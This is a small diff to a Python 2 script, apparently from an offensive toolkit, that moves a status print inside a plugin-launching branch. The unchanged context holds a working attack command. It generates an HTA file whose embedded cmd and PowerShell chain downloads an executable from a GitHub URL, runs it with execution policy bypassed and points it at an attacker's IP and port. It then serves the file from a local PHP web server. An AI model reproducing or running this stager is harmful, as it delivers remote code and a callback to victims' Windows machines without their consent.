@@ -98,9 +98,9 @@ def aner():
     print "\n"
     et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
     if et == 'yes':
+	print "[*] http://0.0.0.0:80"
         os.system('cd plugins && python shellgame-cli.py -k hello -c "cmd /c cd / & mkdir win & cd win & echo (wget "https://github.com/Eitenne/roxysploit/raw/master/storage/mb_client.exe" -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & a.exe --ip %s --port %s --timeout %s" -p Outlook.Application -o index.hta' % (lhost,lport,timeout))
     	os.system('cd plugins && php -S 0.0.0.0:80 &>/dev/null')
-	print "[*] http://0.0.0.0:80"
     elif et == 'no':
         print "Goodbye ;("
         sys.exit()
